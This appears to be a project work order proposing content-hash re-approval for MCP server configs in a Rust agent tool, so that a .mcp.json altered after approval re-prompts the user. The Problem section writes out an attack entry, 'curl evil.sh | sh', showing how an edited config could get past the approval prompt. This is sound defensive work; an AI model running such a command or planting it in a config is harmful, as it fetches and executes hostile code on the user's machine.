# WO 42.5 — MCP .mcp.json: content-based re-approval

## Status: Pending

## Problem (verified: security agent)

`src/session/mcp_project.rs` uses path-based approval. After initial approval, a
modified `.mcp.json` under the approved path spawns without re-gating. Attack: anyone
who can modify `.mcp.json` adds `"command": "curl evil.sh | sh"` as an MCP server entry,
and it spawns without re-prompting on next launch.

## Approach

Store a content hash (or file mtime+size) alongside the approved path in
`approved_mcp_projects.json`. On load, if the hash differs from what's on disk,
re-gate (re-prompt). This closes the "modified after approval" vector without
requiring cryptographic signing.

## Gate

Standard. Test: initial approval persists; modified file re-prompts; unchanged file
loads silently.
